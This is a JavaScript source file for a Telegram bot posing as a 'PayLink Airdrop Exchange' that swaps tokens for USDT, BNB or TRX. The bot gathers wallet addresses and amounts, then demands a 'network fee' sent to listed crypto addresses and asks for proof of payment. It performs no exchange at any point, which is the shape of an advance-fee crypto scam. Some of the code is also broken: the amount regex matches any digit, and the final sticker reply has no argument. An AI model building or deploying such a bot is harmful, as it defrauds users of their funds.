import { Telegraf, Markup } from "telegraf"
import { config } from "dotenv"

config()

const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN

const bot = new Telegraf(TG_TOKEN)

bot.use(Telegraf.log())

bot.command("start", async ctx => {
    await ctx.replyWithHTML(
        `<b>🔰 Hi ${ctx.message.from.username} 🔰</b>\n\n<i>Welcome to the PayLink Airdrop Exchange Bot 🎉. Exchange your PayLink Tokens for USDT, BNB or TRX 💰.</i>`,
        {
            parse_mode : "HTML",
            ...Markup.inlineKeyboard([
                [Markup.button.callback("Exchange Paylink Tokens ♻️", "exchange")]
            ])
        }
    )
})

bot.action("exchange", async ctx => {
    await ctx.replyWithHTML(`<b>🔰 Input your PayLink TRC address here 🔰.</b>\n\n<i>⛔️ Warning : Ensure your wallet address is correct.</i>`)
})

bot.hears(/^T/, async ctx => {
    await ctx.replyWithHTML(
        `<b>🔰 Kindly select the coin/token you would like to exchange for your PayLink token 💰.</b>`,
        {
            parse_mode : "HTML",
            ...Markup.inlineKeyboard([
                [Markup.button.callback("USDT(TRC20) 💲", "token")],
                [Markup.button.callback("BNB(BEP20) 💎", "token")],
                [Markup.button.callback("TRON(TRX) 💎", "token")],
            ])
        }
    )
})

bot.action("token", async ctx => {
    await ctx.replyWithHTML(`<b>🔰 Kindly enter the amount of PayLink tokens you would like to exchange 💰.</b>\n\n<i>⛔️ NB : The mininum amount of PayLink tokens to exchange is 10 while the maximum is 10,000,000.</i>`)
})

bot.hears(/[10-10000000]/, async ctx => {
    await ctx.replyWithHTML(
        `<b>🔰 A Network fee is required or the exchange to be complete 🔰.</b>\n\n<i>Pay the required fee and validate payment to proceed.</i>`,
        {
            parse_mode : "HTML",
            ...Markup.inlineKeyboard([
                [Markup.button.callback("Network Fee ‼️", "fee")]
            ])
        }
    )
})

bot.action("fee", async ctx => {
    await ctx.replyWithHTML(
        `<b>🔰 Network Fee Payment Addresses 🔰.</b>\n<i>Select your preferred payment method 💰.</i>\n\n<b>BNB(BEP20):</b>\n<i>0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c</i>\n\n<b>USDT(TRC20):</b>\n<i>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</i>\n\n<b>TRON(TRX):</b>\n<i>0xce7de646e7208a4ef112cb6ed5038fa6cc6b12e3</i>`,
        {
            parse_mode : "HTML",
            ...Markup.inlineKeyboard([
                [Markup.button.callback("Validate Payment ✅", "validate")]
            ])
        }
    )
})

bot.action("validate", async ctx => {
    await ctx.replyWithHTML(`<b>🔰 PATMENT VERIFICATION 🔰</b>\n\n<i>✅ Submit your payment proof (Transaction ID/Hash/URL)</i>`)
})

bot.hears(/^https/, async ctx => {
    ctx.replyWithSticker()
})

bot.launch()